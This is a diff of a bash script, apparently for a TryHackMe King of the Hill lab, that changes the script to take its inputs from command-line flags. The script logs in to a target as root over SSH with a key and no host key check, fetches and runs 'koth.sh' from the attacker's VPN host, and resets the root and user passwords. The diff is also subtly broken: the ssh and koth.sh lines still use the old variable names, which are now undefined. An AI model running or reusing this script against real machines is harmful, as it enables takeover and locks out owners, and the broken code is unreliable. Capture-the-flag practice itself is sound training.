@@ -1,16 +1,25 @@
 #!/bin/bash
 
-read -p "Enter the machine IP address: " ip_address
-read -p "Your TryHackMe username: " nick
-read -p "Enter the new password: " password
+while getopts ":i:u:p:" opt; do
+  case $opt in
+    i) IP="$OPTARG" ;;
+    u) username="$OPTARG" ;;
+    p) new_password="$OPTARG" ;;
+  esac
+done
+
+if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ]; then
+  echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password'"
+  exit 1
+fi
 
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
 ssh -o StrictHostKeychecking=no -i id_rsa -p 1337 root@"$ip_address" << EOF
 
 cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
-echo "root:$password" | chpasswd
-echo "gloria:$password" | chpasswd
-echo "marty:$password" | chpasswd
+echo "root:$new_password" | chpasswd
+echo "gloria:$new_password" | chpasswd
+echo "marty:$new_password" | chpasswd
 
 EOF
